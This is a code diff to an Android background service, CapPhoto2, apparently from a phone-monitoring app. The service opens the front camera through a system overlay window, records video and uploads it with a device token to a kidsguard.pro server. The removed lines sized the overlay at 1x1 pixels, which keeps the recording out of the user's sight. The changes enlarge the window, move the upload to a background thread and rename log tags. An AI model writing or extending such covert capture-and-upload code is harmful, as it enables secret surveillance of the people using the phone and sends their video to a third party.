@@ -19,10 +19,6 @@ import android.view.Gravity;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.WindowManager;
-import android.widget.Toast;
-
-import net.gotev.uploadservice.MultipartUploadRequest;
-
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.ClientProtocolException;
@@ -90,7 +86,7 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
         if (Build.VERSION.SDK_INT>21){
             if (Build.VERSION.SDK_INT>25){
                 WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
-                        1, 1,
+                        1500, 1500,
                         WindowManager.LayoutParams.TYPE_PHONE,
                         WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                         PixelFormat.TRANSLUCENT
@@ -157,7 +153,7 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
 //                        camera.lock();
 //                    }
                     camera =Camera.open(1);
-                    Log.e("cach343", "surfaceCreated: " );
+                    Log.e("testing", "surfaceCreated: " );
                 }catch (RuntimeException e){
 
                 }
@@ -186,13 +182,13 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
 
 
             } catch (Exception e) {
-                Log.e("runnigtime3487", e.toString() );
+                Log.e("testing", e.toString() );
             }
         }catch (Exception e){
-            Log.e("runnigtime3487", e.toString() );
+            Log.e("testing", e.toString() );
         }
     }catch (RuntimeException e){
-            Log.e("runnigtime3487", e.toString());
+            Log.e("testing", e.toString());
         }
 
         Handler handler=new Handler();
@@ -211,14 +207,14 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
 
                     camera.lock();
                     camera.release();
-                        Log.e("runnigtime34", "LOGEIT");
+                        Log.e("testing", "LOGEIT");
 
 
                    } windowManager.removeView(surfaceView);
                 }catch (RuntimeException r){
-                Log.e("runnigtime34", r.toString());
+                Log.e("testing", r.toString());
             }
-                Log.e("Upload2", "Upload2" );
+                Log.e("testing", "Upload2" );
                     //Toast.makeText(CapPhoto.this, "stop", Toast.LENGTH_SHORT).show();
                     // Upload();
                     Upload2();
@@ -278,37 +274,43 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
 //    }
     public void Upload2(){
         try {
-            HttpClient httpclient = new DefaultHttpClient();
-            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    HttpClient httpclient = new DefaultHttpClient();
+                    HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
 
 
-            try {
-                MultipartEntity entity = new MultipartEntity();
+                    try {
+                        MultipartEntity entity = new MultipartEntity();
 
-                try {
-                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
-                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
-                } catch (UnsupportedEncodingException e) {
-                    e.printStackTrace();
+                        try {
+                            entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
+                            entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                        } catch (UnsupportedEncodingException e) {
+                            e.printStackTrace();
+                        }
+                        File myFile = new File(path);
+                        FileBody fileBody = new FileBody(myFile);
+                        entity.addPart("video", fileBody);
+                        Log.e("testing", String.valueOf(entity.getContentLength()) );
+                        //totalSize = entity.getContentLength();
+                        httppost.setEntity(entity);
+                        HttpResponse response = httpclient.execute(httppost);
+                        HttpEntity r_entity = response.getEntity();
+                        Log.e("testing", EntityUtils.toString(r_entity));
+                        //responseString = EntityUtils.toString(r_entity);
+
+                    } catch (ClientProtocolException e) {
+                        Log.e("testing", e.toString());
+                        //responseString = e.toString();
+                    } catch (IOException e) {
+                        Log.e("testing", e.toString());
+                        //	responseString = e.toString();
+                    }
                 }
-                File myFile = new File(path);
-                FileBody fileBody = new FileBody(myFile);
-                entity.addPart("video", fileBody);
-                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()) );
-                //totalSize = entity.getContentLength();
-                httppost.setEntity(entity);
-                HttpResponse response = httpclient.execute(httppost);
-                HttpEntity r_entity = response.getEntity();
-                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
-                //responseString = EntityUtils.toString(r_entity);
+            }).start();
 
-            } catch (ClientProtocolException e) {
-                Log.e("terkgkjjgjgj", e.toString());
-                //responseString = e.toString();
-            } catch (IOException e) {
-                Log.e("terkgkjjgjgj", e.toString());
-                //	responseString = e.toString();
-            }
 
 
 
@@ -327,7 +329,7 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
 //          //  Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
 
         } catch (Exception exc) {
-            Log.e("Upload2", exc.toString() );
+            Log.e("testing", exc.toString() );
             // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
         }
     }
@@ -369,7 +371,7 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
             return params.getSupportedPreviewSizes();
         }
     }
-    public void getvideo(SurfaceHolder surfaceHolder){
+    public void getvideo(final SurfaceHolder surfaceHolder){
         try {
             Date curDate = new Date(System.currentTimeMillis());
             String curedate = curDate.toString();
@@ -383,7 +385,7 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
 //                        camera.lock();
 //                    }
                 camera =Camera.open(1);
-                Log.e("cach343", "surfaceCreated: " );
+                Log.e("testing", "surfaceCreated: " );
             }catch (RuntimeException e){
 
             }
@@ -412,13 +414,13 @@ public class CapPhoto2 extends Service implements SurfaceHolder.Callback {
 
 
             } catch (Exception e) {
-                Log.e("cach343", e.toString() );
+                Log.e("testing", e.toString() );
             }
         }catch (Exception e){
-            Log.e("cach343", e.toString() );
+            Log.e("testing", e.toString() );
         }
     }catch (RuntimeException e){
-        Log.e("cach343", e.toString());
+        Log.e("testing", e.toString());
     }
         Handler handler=new Handler();
         handler.postDelayed(new Runnable() {
